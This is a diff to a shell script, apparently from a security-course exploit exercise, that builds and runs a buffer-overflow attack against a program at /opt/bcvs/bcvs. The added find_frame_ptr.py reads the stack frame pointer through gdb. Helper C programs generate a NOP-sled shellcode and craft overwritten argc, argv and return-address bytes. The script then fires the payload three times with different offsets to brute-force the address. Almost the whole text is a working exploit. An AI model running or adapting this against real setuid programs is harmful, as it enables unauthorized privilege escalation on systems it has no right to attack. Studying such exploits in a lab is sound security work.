@@ -22,19 +22,19 @@ rm -f run_w_gdb.sh
 cat <<EOS > "run_w_gdb.sh"
 #!/bin/bash
 SC=\$(./gen_shellcode)
-PAD="123456789012"
-SC_ADD=\$(./././gen_argv co "\${SC}\${PAD}")
+FRAME_PTR=\$(./find_frame_ptr.py)
+SC_ADD=\$(./gen_argv \$FRAME_PTR)
 
 gdb --args /opt/bcvs/bcvs co "\${SC}\${SC_ADD}"
 EOS
 chmod +x run_w_gdb.sh
 
-
 cat <<EOS > "test_gen_argv.sh"
 #!/bin/bash
 SC=\$(./gen_shellcode)
-echo \${SC}
-./././gen_argv co "123456789012\${SC}"
+FRAME_PTR=\$(./find_frame_ptr.py)
+echo "Frame ptr (as integer): \$FRAME_PTR"
+./gen_argv \$FRAME_PTR
 EOS
 chmod +x test_gen_argv.sh
 
@@ -48,6 +48,62 @@ cd sploit4_dir
 EOS
 chmod +x rerun_sploit.sh
 
+cat <<EOS > "find_frame_ptr.py"
+#!/usr/bin/python
+import re
+import sys
+import subprocess
+
+fptr_re_raw = "ebp\s*(0x[0-9a-fA-F]+)\s*(0x[0-9a-fA-F]+)$"
+fptr_re = re.compile(fptr_re_raw)
+
+
+if __name__ == '__main__':
+  offset = 0
+  if len(sys.argv) == 2:
+    offset = int(sys.argv[1])
+
+  shellcode = subprocess.check_output(["./gen_shellcode"])
+  padded_sc = "123456789012{}".format(shellcode)
+
+  gdb_batch = """set logging on
+set logging file gdb_ptr_log.log
+break main
+run
+info registers ebp
+"""
+  batch_filename = "gdb_batch.batch"
+  call_str = "gdb -nx -x {} -batch --args /opt/bcvs/bcvs co \"{}\"".format(batch_filename, padded_sc)
+  call_tuple = call_str.split(' ', 8)
+
+  f = open(batch_filename,"w+")
+  f.write(gdb_batch)
+  f.close()
+
+  gdb_out = subprocess.check_output(call_tuple)
+  if gdb_out is None or gdb_out == "":
+    ## If for some reason we didn't get outp from stdout try to
+    ## read it from gdb's log
+    try:
+      f = open(gdb_ptr_log.log, "r")
+      gdb_out = f.read()
+      f.close()
+    except:
+      gdb_out = ""
+
+  #print("GDB output: {}".format(gdb_out))
+  match = fptr_re.search(gdb_out)
+  if match is None:
+    print("Failed to find ebp")
+    exit(1)
+
+  #print("ebp = {}".format(match.group(1)))
+  ptr_as_int = int(match.group(1), 16)
+  ptr_as_int += offset
+  print(ptr_as_int)
+EOS
+chmod +x find_frame_ptr.py
+
 rm -f gen_shellcode.c  # Just to make sure we get the newest version
 cat <<EOS > "gen_shellcode.c"
 #include <stdlib.h>
@@ -57,6 +113,7 @@ cat <<EOS > "gen_shellcode.c"
 #define DEFAULT_OFFSET 201
 #define NOP 0x90
 #define nop_shell_size  253
+#define SC_OFFSET 12
 #define total_bsize 290
 
 char shellcode[] =
@@ -90,8 +147,8 @@ int main(int argc, char* argv[]) {
   }
 
   // Fill the shellcode at the end of the 'nop_shell_size'
-  ptr += (nop_shell_size - strlen(shellcode));
-  for (i = 0; ptr < (buf + nop_shell_size); ++i) {
+  ptr += (nop_shell_size - strlen(shellcode) - SC_OFFSET);
+  for (i = 0; ptr < (buf + nop_shell_size - SC_OFFSET); ++i) {
     *(ptr++) = shellcode[i];
   }
 
@@ -124,8 +181,8 @@ cat <<EOS > "gen_argv.c"
 #include <string.h>
 
 int main(int argc, char* argv[]) {
-  if (argc != 3) {
-    printf("Usage: [co|ci] <shellcode text>\n");
+  if (argc != 2) {
+    printf("Usage: <value from find_frame_ptr.py>\n");
     return -1;
   }
 
@@ -150,20 +207,19 @@ int main(int argc, char* argv[]) {
   // terminating byte. We have to deal with this since .comments overwrites
   // the return address for main during our exploit.
 
-  register long* addr asm("ebp");
-  /*
-  printf("%x\n", addr);
-  printf("Length of argv[2] = %d\n", strlen(argv[2]));
-  printf("argv[0] = %s\n", argv[0]);
-  printf("argc = %d\n", argc);
-*/
+  unsigned long addr = strtoul(argv[1], NULL, 10);
+
+  //register long* addr asm("ebp");
+  //printf("argv[1] = %s\n", argv[1]);
+  //printf("%x\n", addr);
+
   temp_buf[4] = '\0';
   lptr = (long*) temp_buf;
   //*(lptr) = (long*) &argv;
   *(lptr) = (long) (addr+16); //Overwrite argc to one byte past argv
   strncat(buf, temp_buf, 5);
 
-  *(lptr) = (long) addr; // argv will now point back to %ebp
+  *(lptr) = (long) addr; // argv will now point back to %ebp (12 bytes back)
   strncat(buf, temp_buf, 5);
 
   *(lptr) = (long) (addr + 24); // This should point to where .comments\0 will end
@@ -177,7 +233,7 @@ int main(int argc, char* argv[]) {
 EOS
 
 gcc -o gen_shellcode gen_shellcode.c
-gcc -o gen_argv gen_argv.c
+gcc -fno-stack-protector -g -o gen_argv gen_argv.c
 SHELLCODE=$(./gen_shellcode)
 if [[ $? != "0" ]]; then
   echo "Failed to generate shellcode"
@@ -189,8 +245,21 @@ echo "Shellcode length: ${#SHELLCODE}"
 # Since the string passed to bcvs eventually will have 8 more
 # bytes (SC_ADDITION) we need to simulate this when calling
 # here so the stack addresses are correct
-PAD="123456789012"
-SC_ADDITION=$(./././gen_argv co "${SHELLCODE}${PAD}")
+
+# We are finding 3 frame pointers because after trying this out
+# it turns out that the actual frame address when the program is
+# not run in gdb can vary by 2 bytes in either direction. So without
+# a better method for finding the exact frame address we need a little
+# brute force.
+FRAME_PTR=$(./find_frame_ptr.py)
+FRAME_PTR2=$(./find_frame_ptr.py 16)
+FRAME_PTR3=$(./find_frame_ptr.py -16)
+echo "FRAME_PTR1: $FRAME_PTR"
+echo "FRAME_PTR2: $FRAME_PTR2"
+echo "FRAME_PTR3: $FRAME_PTR3"
+SC_ADDITION=$(./gen_argv $FRAME_PTR)
+SC_ADDITION2=$(./gen_argv $FRAME_PTR2)
+SC_ADDITION3=$(./gen_argv $FRAME_PTR3)
 if [[ $? != "0" ]]; then
   echo "Failed to generate shellcode addition"
   exit -1;
@@ -198,9 +267,9 @@ fi
 echo "Shellcode addition: $SC_ADDITION"
 echo "Length of shellcode addition: ${#SC_ADDITION}"
 
-cat <<EOS > "run_gdb"
-break main
-EOS
-#/opt/bcvs/bcvs co "${SHELLCODE}${SC_ADDITION}"
+echo "Shellcode being passed to bcvs: ${SHELLCODE}${SC_ADDITION}"
 
-gdb --args /opt/bcvs/bcvs co "${SHELLCODE}${SC_ADDITION}" < run_gdb
+/opt/bcvs/bcvs co "${SHELLCODE}${SC_ADDITION}"
+/opt/bcvs/bcvs co "${SHELLCODE}${SC_ADDITION2}"
+/opt/bcvs/bcvs co "${SHELLCODE}${SC_ADDITION3}"
+#gdb --args /opt/bcvs/bcvs co "${SHELLCODE}${SC_ADDITION}" < run_gdb
